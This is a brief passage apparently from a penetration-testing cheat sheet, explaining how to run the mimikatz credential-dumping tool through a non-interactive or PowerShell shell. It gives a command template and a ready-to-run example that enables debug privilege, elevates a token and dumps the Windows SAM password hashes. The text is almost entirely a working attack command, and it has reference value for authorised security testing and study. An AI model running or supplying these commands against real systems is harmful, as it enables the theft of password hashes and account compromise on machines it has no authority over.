### One-liner execution

* If you have a non-interactive shell or a Powershell shell, you have to execute the commands via parameters:
  ```powershell
  .\mimikatz.exe "privilege::debug" "<command>" "exit"
  ```
* An example would be:  
  ```powershell
  .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
  ```
